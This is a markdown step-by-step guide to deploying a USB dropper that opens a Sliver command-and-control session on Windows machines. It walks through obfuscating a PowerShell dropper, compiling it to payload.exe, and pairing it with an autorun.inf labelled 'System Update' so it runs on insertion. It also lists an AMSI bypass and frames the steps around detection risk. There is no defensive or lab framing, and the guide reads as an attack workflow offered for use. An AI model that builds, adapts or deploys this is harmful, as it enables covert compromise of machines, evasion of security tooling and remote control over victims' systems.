# Deployment Workflow - Complete Guide

**Platform:** macOS to Windows USB  
**Time:** 5 minutes  
**Requirements:** Python 3, USB (exFAT), Windows machine (or WSL)

---

## Option A: Full Deployment (Recommended)

### A1. On macOS - Prepare

```bash
cd /Users/iklo/hack/usb-auto

# Verify files ready
bash verify-ready.sh
# Note: PowerShell check will fail on Mac (OK - PowerShell is Windows-only)

# Make scripts executable
chmod +x build-and-deploy.sh verify-ready.sh
```

### A2. On Windows Target - Compile & Deploy

**Transfer to Windows machine:**
```powershell
# Copy entire usb-auto folder to Windows
# E.g., C:\maldev\usb-auto\
```

**Run deployment:**
```powershell
cd C:\maldev\usb-auto
.\build-and-deploy.sh D: http://192.168.1.100:8080
# OR in PowerShell:
powershell -NoProfile -File build-and-deploy.sh -USBPath "D:" -C2URL "http://192.168.1.100:8080"
```

### A3. Insert USB on Target

- Insert USB on Windows Server 2016 / Windows 10 / Windows 11
- Monitor C2 for callback
- Commands available: DELETE, payload URL, recon request

---

## Option B: Quick Manual Deploy (Mac only)

If you don't have access to Windows for compilation:

### B1. Copy Raw Files to USB

```bash
# Format USB
diskutil secureErase 0 JHFS+ USB /dev/diskX

# Copy files
cp lib/sliver-dropper-core.ps1 /Volumes/USB/
cp usb-autorun.inf /Volumes/USB/autorun.inf

# Create minimal launcher (no obfuscation)
cat > /Volumes/USB/run.bat << 'EOF'
@echo off
powershell -NoProfile -File sliver-dropper-core.ps1
EOF
```

**Limitation:** No obfuscation (raw PowerShell visible in memory)

---

## Option C: Remote PowerShell Compilation

Compile on a remote Windows machine via SSH:

```bash
# From Mac
sshpass -e ssh -p 22 user@windows-machine.local "cd C:\usb-auto && powershell -NoProfile -File build-and-deploy.sh -USBPath 'D:' -C2URL 'http://192.168.1.100:8080'"
```

---

## Recommended: Option A (Full)

### Setup Summary

**macOS (prep):**
```bash
cd /Users/iklo/hack/usb-auto
ls -lh lib/sliver-dropper-core.ps1  # Verify core file
```

**Windows (build):**
```powershell
# Copy to Windows
Copy-Item "\\mac\shared\usb-auto" -Destination "C:\maldev\usb-auto" -Recurse

# Run build
cd C:\maldev\usb-auto
powershell -NoProfile -Command ". .\lib\obfuscation.ps1; Obfuscate-PowerShellScript -ScriptPath 'lib\sliver-dropper-core.ps1'"
python.exe .\lib\ps2exe-wrapper.py lib\sliver-dropper-core.ps1_obfuscated.ps1 -o payload.exe --c2-url "http://YOUR_IP:8080"

# Copy to USB
Copy-Item "payload.exe" "D:\"
Copy-Item "usb-autorun.inf" "D:\"
```

---

## Pre-Flight Checklist

- [ ] USB formatted (exFAT or NTFS)
- [ ] C2 server running (http://YOUR_IP:8080)
- [ ] /health endpoint responds
- [ ] Python 3 installed
- [ ] PowerShell 5+ available (if compiling on Windows)
- [ ] All files in `/Users/iklo/hack/usb-auto/`
- [ ] USB has payload.exe + autorun.inf

---

## Verify Deployment

After copying to USB:

```bash
# Check files on USB
ls -lh /Volumes/USB/
# Should show:
#   payload.exe (450-500 KB)
#   autorun.inf (200 bytes)

# Check autorun.inf content
cat /Volumes/USB/autorun.inf
# Should show:
#   [autorun]
#   open=payload.exe
#   label=System Update
```

---

## Insert on Target & Monitor

```powershell
# On target Windows machine
# 1. Insert USB
# 2. Wait 5 seconds (payload.exe may execute silently)

# On C2 server
sliver > sessions
# Expected: new session from target hostname
```

---

## If Compilation Fails

**Fallback (no obfuscation):**
```powershell
# Skip obfuscation, use raw dropper
Copy-Item "lib\sliver-dropper-core.ps1" "D:\dropper.ps1"

# Update autorun.inf
# open=powershell.exe -NoProfile -File dropper.ps1

# USB will work but detection risk is higher
```

---

## Files Required

```
Minimal (no obfuscation):
  ✓ sliver-dropper-core.ps1
  ✓ usb-autorun.inf
  ✓ lib/sliver-connector-v2.ps1
  ✓ lib/aes-gcm-encryption.ps1
  ✓ lib/amsi-bypass.ps1

Full (with obfuscation):
  ✓ All above
  ✓ lib/obfuscation.ps1
  ✓ lib/ps2exe-wrapper.py
  ✓ payload.exe (compiled)
```

---

## Summary

| Step | Where | Tool | Time |
|------|-------|------|------|
| Prepare USB | Mac | diskutil | 1min |
| Obfuscate | Windows | powershell | 1min |
| Compile | Windows | python | 2min |
| Deploy | USB | cp | 1min |
| **Total** | — | — | **5min** |

---

**Next:** Follow Option A for full deployment with obfuscation.
